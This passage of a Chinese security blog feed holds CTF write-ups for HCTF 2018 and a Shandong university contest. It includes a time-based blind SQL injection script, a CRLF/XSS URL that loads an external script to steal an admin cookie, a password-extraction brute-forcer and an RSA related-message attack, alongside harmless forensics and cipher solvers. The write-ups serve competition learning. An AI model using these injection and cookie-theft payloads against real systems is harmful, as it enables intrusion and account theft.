class="keyword">Array</span> ( [union] =&gt; <span class="number">1</span> [b] =&gt; <span class="number">2</span> [c] =&gt; <span class="number">3</span> )</span><br></pre></td></tr></table></figure><p>原地址关了，本地起的docker</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url  =  <span class="string">'http://127.0.0.1:10000/admin/index.php'</span></span><br><span class="line">dic = <span class="string">''</span></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    dic += chr(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'dic is :'</span>+dic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp += <span class="string">'\u00'</span>+str(i.encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    isok = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">"admin' and if((substr((select binary F1a9 from F1444g),%d,1)='%s'),sleep(5),1)#"</span>.replace(<span class="string">' '</span>,<span class="string">'/**/'</span>) % (i,d)</span><br><span class="line">        data = <span class="string">'&#123;"admin_user":"'</span>+ encode(payload) +<span class="string">'","admin_pass":"1"&#125;'</span></span><br><span class="line">        cookies = &#123;<span class="string">'islogin'</span>:<span class="string">'1'</span>,<span class="string">'login_data'</span>:data&#125;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+]trying: '</span>+payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url,cookies=cookies).text</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt;= <span class="number">3</span>:</span><br><span class="line">            key += d</span><br><span class="line">            isok = <span class="number">1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'update key :'</span>+key</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> isok == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*]:'</span>+key</span><br></pre></td></tr></table></figure><p><code>hctf{hctf_2018_kzone_Author_Li4n0}</code></p><h3 id="Bottle"><a href="#Bottle" class="headerlink" title="Bottle"></a>Bottle</h3><p>利用CSRF构造xss获取cookie</p><p>exp:</p><p><a href="http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:0/%250aContent-Type:text/html%250aContent-Security-Policy:script-src%2520*%250a%250a%3Cscript/src=http://zzm.cat/1.js%3E%3C/script%3E" target="_blank" rel="noopener">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:0/%250aContent-Type:text/html%250aContent-Security-Policy:script-src%2520*%250a%250a%3Cscript/src=http://zzm.cat/1.js%3E%3C/script%3E</a></p><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>可以按照密码进行排序</p><p>注册新用户，密码逐位逐位与admin的密码比较，得到admin的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re</span><br><span class="line">def reg(username,password):</span><br><span class="line">    url = &quot;http://game.2018.hctf.io/web2/action.php?action=reg&quot;</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;username&quot;:username,</span><br><span class="line">        &quot;password&quot;:password,</span><br><span class="line">        &quot;sex&quot;:1,</span><br><span class="line">        &quot;submit&quot;:&quot;submit&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    content = requests.post(url=url,data=data).content</span><br><span class="line">    print content</span><br><span class="line">login_url = &quot;http://game.2018.hctf.io/web2/action.php?action=login&quot;</span><br><span class="line">ss =  &quot;-/123456789&quot;+string.lowercase</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for j in range(33,126):</span><br><span class="line">        username = &quot;aaaafaffmpxxm&quot;+str(i) +&quot;fdfdlxx8alsdff&quot;+str(j)</span><br><span class="line">        password = flag + chr(j)</span><br><span class="line">        print username,password</span><br><span class="line">        reg(username,password)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;username&quot;:username,</span><br><span class="line">            &quot;password&quot;:str(password),</span><br><span class="line">            &quot;submit&quot;:&quot;submit&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        print data</span><br><span class="line">        req = requests.session()</span><br><span class="line">        content = req.post(url=login_url,data=data).content</span><br><span class="line">        #print content</span><br><span class="line">        order_url = &quot;http://game.2018.hctf.io/web2/user.php?order=password&quot;</span><br><span class="line">        content = req.get(url=order_url).content</span><br><span class="line">        #print content</span><br><span class="line">        tmp = re.findall(r&apos;%s[.\s\S]+?&lt;td&gt;\s*1\s*&lt;/td&gt;\s*&lt;td&gt;\s*admin\s*&lt;/td&gt;&apos;%username,content,re.S)</span><br><span class="line">        if tmp:</span><br><span class="line">            flag = flag + chr(j-1)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>密码为dsa8&amp;&amp;!@#$%^&amp;d1ngy1as3dja</p><h3 id="freq-game"><a href="#freq-game" class="headerlink" title="freq game"></a>freq game</h3><p>果然爆破是不行的，利用FFT求频域分量，这就触及到我知识的盲区了</p><p>Eur3kAd队伍的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import json</span><br><span class="line">import numpy as np</span><br><span class="line">io=remote(&quot;150.109.119.46&quot;,6775)</span><br><span class="line">token=&quot;DN2WQ9iOvvAGyRxDC4KweQ2L9hAlhr6j&quot;</span><br><span class="line">io.recvuntil(&quot;hint:&quot;)</span><br><span class="line">io.sendline(&quot;y&quot;)</span><br><span class="line">io.recvuntil(&quot;token:&quot;)</span><br><span class="line">io.sendline(token)</span><br><span class="line">for i in range(8):</span><br><span class="line">    io.recvuntil(&quot;[&quot;)</span><br><span class="line">    arr=io.recvuntil(&quot;]&quot;)[:-1]</span><br><span class="line">    arr=arr.split(&quot;,&quot;)</span><br><span class="line">    arr=map(float,arr)</span><br><span class="line">    time_val=np.array(arr)</span><br><span class="line"></span><br><span class="line">    freq_val=np.fft.fft(time_val)</span><br><span class="line">    freq_val=map(abs,freq_val)</span><br><span class="line">    freq_val_sorted=[i for i in freq_val]</span><br><span class="line">    freq_val_sorted.sort(reverse=1)</span><br><span class="line">    response=[]</span><br><span class="line">    for j in range(4):</span><br><span class="line">        response.append(min(freq_val.index(freq_val_sorted[j*2]),freq_val.index(freq_val_sorted[j*2+1])))</span><br><span class="line">    response_data=&quot;&quot;</span><br><span class="line">    for ele in response:</span><br><span class="line">        response_data+=str(ele)</span><br><span class="line">        response_data+=&quot; &quot;</span><br><span class="line">    print response_data</span><br><span class="line">    io.sendline(response_data[:-1])</span><br><span class="line">   # io.interactive()</span><br><span class="line">    raw_input()   </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>相关知识：<a href="https://findneo.github.io/171005NuptVigenereWP/" target="_blank" rel="noopener">https://findneo.github.io/171005NuptVigenereWP/</a></p><h3 id="xor-rsa"><a href="#xor-rsa" class="headerlink" title="xor?rsa"></a>xor?rsa</h3><p>搬运表哥的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#short_pad_attack</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span><span class="params">(c1, c2, e, n)</span>:</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"></span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.5</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span><span class="params">(c1, c2, diff, e, n)</span>:</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(g1, g2)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = <span class="number">27325117725066040425607261774702361305480031598260844657255259687949217947185875178414548742392020321812299436880101297227536559351730987915023996386949560743215563482065620796558339146309680837896911726355137737632498099719814507374535188668253558193836192571274971401444835848784952120830068942707870865057672494962150591569745891058420271040371596557379014064434807827018829839225991842910855143477861477983283840739861588719497836896794690605981838804564450022566211353870681343247472863651535379377939787977703685860325769265931265226619644497391491291527800611615877993682121665020799611215291015673668800698047</span></span><br><span class="line">    e = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = nbits//(<span class="number">2</span>*e*e)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"upper %d bits (of %d bits) is same"</span> % (nbits-kbits, nbits)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ^^ = bit-wise XOR</span></span><br><span class="line">    <span class="comment">#m1 = randrange(2^nbits)</span></span><br><span class="line">    <span class="comment">#m2 = m1 ^^ randrange(2^kbits)</span></span><br><span class="line">    <span class="comment">#c1 = pow(m1, e, n)</span></span><br><span class="line">    <span class="comment">#c2 = pow(m2, e, n)</span></span><br><span class="line">    c1 = <span class="number">11146034647280413317443457623961239386839900851075033268495975097708099527017335893963808711594413240859252161601911195036434302423516981466705590143210837021632070692393449550584035345686324553211866055113228844210586772947411150216954229676034855823178188075496107807422868588742623940922760678808366543964733293726627911767243105246511250395661759753616263358374760407323735205233663336331991977749138009890575029063032763890464116037245275157079519540406571208629258706809359182978155122176341736830080587038326813241565093027445769495005048088248614564197179762009363506397136188047072831062771044194671584000093</span></span><br><span class="line">    c2 = <span class="number">1206394889096499960081166011318481718487253865371591152275319942955987797889761136562701508553079502547193102588852377842551044867961440512715093383379196683866396069689611910096194350083404638346362642034206212849366833513854922022537854397304980423004330041027521742652293082886524946291846011200632987593435588619763971528985802898982891100146430607274314417600181969864547689720620303929732924061673055082880492983474112109999173957339098639555381626435870355703616291445746057601759611370928227297606247782969343337389538257681315001213167257800476196167120597495582636973391942846610897276862327699998885589310</span></span><br><span class="line"></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"difference of two messages is %d"</span> % diff</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print m1</span></span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"m1 = "</span>: m1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"m2 = "</span>: m1 + diff</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="http://p0desta.com" target="_blank" rel="noopener">http://p0desta.com</a></p><p><a href="https://xz.aliyun.com/t/3253#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-7</a></p><p><a href="https://xz.aliyun.com/t/3255#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/3255#toc-4</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="http://j0k3r.top/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>第七届山东省大学生网络安全技能大赛决赛Writeup</title>
    <link href="http://j0k3r.top/2018/11/06/kelai_wp/"/>
    <id>http://j0k3r.top/2018/11/06/kelai_wp/</id>
    <published>2018-11-05T16:00:00.000Z</published>
    <updated>2019-04-22T11:52:30.014Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><p>感觉难度不是特别大，不过自己太菜了，很多分不该失</p><h3 id="特殊后门"><a href="#特殊后门" class="headerlink" title="特殊后门"></a>特殊后门</h3><blockquote><p>从通信方式的角度看，后门可分为http/https型、irc型、dns型、icmp型等等。安全人员抓到一份可疑的流量包，请从中分析出利用某种特殊协议传输的数据。</p></blockquote><p>这里是通过icmp,直接过滤出来</p><p>第一个icmp就给了提示</p><p><img src="https://i.loli.net/2018/11/05/5be04ba7a37e4.png" alt="https://i.loli.net/2018/11/05/5be04ba7a37e4.png"></p><p>接着每个icmp包里都有一个flag字符，拼起来即可</p><p><code>flag{Icmp_backdoor_can_transfer_some_information}</code></p><h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p>首先在分组详情中搜索hostname字符串，接着追踪tcp流，在tcp流中再次查找hostname字符串</p><p><img src="https://i.loli.net/2018/11/05/5be051b6c7997.png" alt="https://i.loli.net/2018/11/05/5be051b6c7997.png"></p><p>16进制很明显了</p><p><code>flag{6ad4c5a09043}</code></p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>有点长，比赛时手撕的。。</p><p>赛后了，就写个脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">'log.txt'</span>,<span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_and_write</span><span class="params">(a)</span>:</span></span><br><span class="line">    tmp = urllib.unquote(a)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'200'</span> <span class="keyword">and</span> <span class="string">'flag_is_here'</span> <span class="keyword">and</span> <span class="string">'RCKM'</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> tmp:</span><br><span class="line">        file.write(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'access.log'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> el <span class="keyword">in</span> f.readlines():</span><br><span class="line">        decode_and_write(el)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'log.txt'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> ff:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    char = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> el <span class="keyword">in</span> ff.readlines():</span><br><span class="line">        num1 = re.findall(<span class="string">r'AND ORD\(MID\(\(SELECT IFNULL\(CAST\(flag AS CHAR\),0x20\) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1\),(.*?),1\)\)&gt;.*?'</span>,el)</span><br><span class="line">        num2 = re.findall(<span class="string">r'AND ORD\(MID\(\(SELECT IFNULL\(CAST\(flag AS CHAR\),0x20\) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1\),.*?,1\)\)&gt;(.*?) AND'</span>,el)</span><br><span class="line">        <span class="keyword">if</span> num1[<span class="number">0</span>] == str(i):</span><br><span class="line">            char = chr(int(str(num2[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += chr(ord(char)+<span class="number">1</span>)</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> num1[<span class="number">0</span>] == str(i):</span><br><span class="line">                char = chr(int(str(num2[<span class="number">0</span>])))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">ff.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/05/5be062d00b570.png" alt="https://i.loli.net/2018/11/05/5be062d00b570.png"></p><p>少个}</p><h3 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h3><p>foremost分离出图片内的压缩包</p><p>压缩包密码在图片详细信息中</p><p><code>flag{3XiF_iNf0rM@ti0n}</code></p><h3 id="神秘的文件"><a href="#神秘的文件" class="headerlink" title="神秘的文件"></a>神秘的文件</h3><p>zip明文攻击</p><p><img src="https://i.loli.net/2018/11/06/5be15cc551ed6.png" alt="https://i.loli.net/2018/11/06/5be15cc551ed6.png"></p><p>将得到的docx改为.zip,解压，docProps文件夹内有flag.txt</p><p>base64解码就好</p><p><code>flag{d0cX_1s_ziP_file}</code></p><h3 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h3><p><img src="https://i.loli.net/2018/11/05/5bdffe4075b7c.png" alt="https://i.loli.net/2018/11/05/5bdffe4075b7c.png"></p><p>明显RGB画图了，就是135000开不了平方，测试150x900是最好的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">pic = Image.new(<span class="string">"RGB"</span>,(<span class="number">150</span>, <span class="number">900</span>))</span><br><span class="line">fo = open(<span class="string">"basic.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">pics = []</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">135000</span>: </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a = fo.readline()</span><br><span class="line">    pics.append(a)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">str = <span class="string">""</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">900</span>):</span><br><span class="line">        s = pics[i].split(<span class="string">','</span>)</span><br><span class="line">        pic.putpixel([y,x],(int(s[<span class="number">0</span>]), int(s[<span class="number">1</span>]), int(s[<span class="number">2</span>])))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">"flagg.png"</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/05/5bdffdbd428f7.png" alt="https://i.loli.net/2018/11/05/5bdffdbd428f7.png"></p><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><p>得到如下文本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e</span><br></pre></td></tr></table></figure><p>python转换进制即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">"text.txt"</span>,<span class="string">'r'</span>)</span><br><span class="line">jin = file.read().split(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> jin:</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'d'</span>:</span><br><span class="line">        tmp = chr(int(str(i)[<span class="number">1</span>:]))</span><br><span class="line">        data += tmp</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'x'</span>:</span><br><span class="line">        data += chr(int(str(i)[<span class="number">1</span>:],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'b'</span>:</span><br><span class="line">        data += chr(int(str(i)[<span class="number">1</span>:],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'o'</span>:</span><br><span class="line">        data += chr(int(str(i)[<span class="number">1</span>:],<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> data</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/05/5bdfffaa02e7a.png" alt="https://i.loli.net/2018/11/05/5bdfffaa02e7a.png"></p><h3 id="affine"><a href="#affine" class="headerlink" title="affine"></a>affine</h3><p>即仿射加密</p><p>拿出珍藏的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">affine</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    pwd_dic = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        pwd_dic[chr(((a * i + b) % <span class="number">26</span> + <span class="number">97</span>))] = chr(i + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">return</span> pwd_dic</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pwd_dic = &#123;&#125;</span><br><span class="line">    pwd = raw_input(<span class="string">'str: '</span>)</span><br><span class="line">    a = input(<span class="string">'input a (c = (am + b) mod 26) : 